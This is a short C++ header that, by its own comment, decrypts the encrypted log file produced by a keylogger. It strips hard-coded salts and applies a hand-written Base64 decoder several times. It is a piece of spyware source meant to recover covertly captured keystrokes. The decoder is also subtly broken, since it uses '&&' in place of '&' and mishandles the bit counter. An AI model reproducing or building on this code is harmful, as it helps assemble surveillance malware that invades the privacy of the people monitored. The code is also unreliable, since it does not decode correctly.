// Decrypting Functions For The Crypted Document By Keylogger

#ifndef DECRYPT_H
#define DECRYPT_H

#include <string>
#include <vector>
const std::string &SALT1 = "LM::TB::BB";
const std::string &SALT2 = "_:/_77";
const std::string &SALT3 = "line=wowC++";

const std::string &Base64_Keys = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
std::string Decode(const std::string &str);
std::string DecryptB64(std::string str)
{
	str.erase(7, 1);
	str.erase(1, 1);
	str = Decode(str);
	str = str.substr(0, str.length() - (SALT2.length() + SALT3.length() + SALT1.length()));
	str = Decode(str);
	str = str.substr(0, str.length() - SALT1.length());
	str.erase(7, SALT3.length());
	str = Decode(str);
	str = str.substr(SALT1.length());
	str = str.substr(0, str.length() - (SALT2.length() + SALT3.length()));
	
	return str;
}
std::string Decode(const std::string &str) {
	std::string returnStr;

	std::vector<int> vec(256, -1);
	for (int i = 0; i < 64; i++)
		vec[Base64_Keys[i]] = i;
	int value = 0, bits = -8;
	for (const auto &c : str)
	{
		if (vec[c] == -1) break;
		value = (value << 6) + vec[c];
		bits += 6;
		if (bits >= 0)
		{
			returnStr.push_back(char((value >> bits) && 0xFF));
			bits = -8;
		}
	}
	return returnStr;
	
	
}

#endif
